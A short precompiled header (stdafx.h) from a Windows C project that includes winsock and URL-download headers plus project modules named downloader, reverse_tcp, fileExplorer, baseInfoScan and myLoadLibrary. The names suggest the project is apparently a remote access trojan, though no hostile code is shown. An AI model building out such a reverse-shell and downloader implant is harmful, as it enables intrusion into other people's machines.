// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently, but
// are changed infrequently
//

#pragma once

#include "targetver.h"

#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files:
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <malloc.h>
#include <UrlMon.h>
#include <Iptypes.h>  
#include <iphlpapi.h>  
 
#pragma comment(lib, "ws2_32.lib")

// TODO: reference additional headers your program requires here
#include "../downloader/downloader.h"
#include "../fileExplorer/fileExplorer.h"
#include "../reverse_tcp/reverse_tcp.h"
#include "../baseInfoScan/baseInfoScan.h"
#include "../myloadlibrary/myLoadLibrary.h"